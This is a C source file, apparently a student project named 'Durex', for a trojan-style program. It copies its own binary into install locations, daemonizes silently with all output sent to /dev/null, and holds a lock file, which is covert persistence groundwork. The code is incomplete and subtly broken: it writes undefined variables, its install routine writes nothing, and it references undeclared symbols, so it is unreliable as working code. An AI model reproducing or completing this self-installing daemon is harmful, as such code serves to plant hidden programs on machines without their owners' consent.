/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   durex.c                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/06/28 08:13:10 by root              #+#    #+#             */
/*   Updated: 2018/07/13 14:32:51 by root             ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

/* getrlimit */
#include <sys/time.h>
#include <sys/resource.h>
/* memset strlen */
#include <string.h>
/* signal */
#include <signal.h>
/* open umask */
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
/* mmap */
#include <sys/mman.h>

#include "durex.h"
#include <stdio.h>
static void			closeFileDescriptors(void)
{
	struct rlimit	lim;
	size_t			i;

	i = 3;
	if (getrlimit(RLIMIT_NOFILE, &lim) == -1)
		return ;
	while (i < lim.rlim_max)
		close(i++);
}

static void			sanitizeEnvironment(void)
{
	extern char		**environ;

	for (int i = 0; environ && environ[i]; i++)
		memset(environ[i], 0, strlen(environ[i]));
}

static int			daemonize()
{
	int		fd;
	pid_t	pid;

	pid = fork();
	if (pid < 0)
		return 1;
	if (pid > 0)
		quitClearlyDaemon();

	if (setsid() < 0)
		return 1;
	pid = fork();
	if (pid < 0)
		return 1;
	if (pid > 0)
		quitClearlyDaemon();

	fd = 0;
	while (fd < NSIG)
		signal(fd++, daemonSigHandler);

	fd = open("/dev/null", O_RDWR);
	if (fd < 0)
		return 1;
	dup2(fd, STDIN_FILENO);
	dup2(fd, STDOUT_FILENO);
	dup2(fd, STDERR_FILENO);
	close(fd);
	umask(0);
	if (chdir("/") < 0)
		return 1;
	sleep(1);
	return 0;
}

static void			create_binary(int durex, t_bin *bin)
{
	int				fd;

	if ((fd = open("./Durex", O_RDONLY)) == -1)
		return ;
	if ((bin->size = lseek(fd, 1, SEEK_END)) == -1) {
		close(fd);
		return ;
	}
	bin->data = mmap(NULL, bin->size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
	if (bin->data == MAP_FAILED) {
		close(fd);
		return ;
	}
	close(fd);
	write(durex, data, size);
}

static void			install_binary(t_bin *bin)
{
	int				fd;

	if ((fd = open(DUREX_INSTALL_FILE1, O_CREAT | O_EXCL | O_WRONLY, 0755)) != -1) {

		close(fd);
	}
	if ((fd = open(DUREX_INSTALL_FILE2, O_CREAT | O_EXCL | O_WRONLY, 0755)) != -1) {

		close(fd);
	}
}

int					main(int ac, char **av)
{
	int				fd;
	t_bin			bin;

	(void)ac;
	(void)av;
	if (setuid(getuid()) == -1)
		return 0;
	if ((fd = open(DUREX_CREATE_FILE, O_CREAT | O_EXCL | O_WRONLY, 0755)) != -1) {
		memset(&bin, 0, sizeof(bin));
		create_binary(fd, &bin);
		close(fd);
		if (bin.data == MAP_FAILED) {
			remove(DUREX_INSTALL_FILE);
			return 0;
		}
		install_binary(&bin);
		write(STDIN_FILENO, "gbourgeo\n", 9);
		return 0;
	}
	closeFileDescriptors();
	sanitizeEnvironment();
	e.lock = open(DUREX_LOCK_FILE, O_RDWR | O_CREAT | O_EXCL, 0600);
	if (e.lock < 0)
		return 0;
	if (flock(e.lock, LOCK_EX | LOCK_NB))
		return 0;
	e.child = 0;
	if (daemonize())
		return 0;
	e.child = 1;

	quitClearlyDaemon();
	return 0;
}
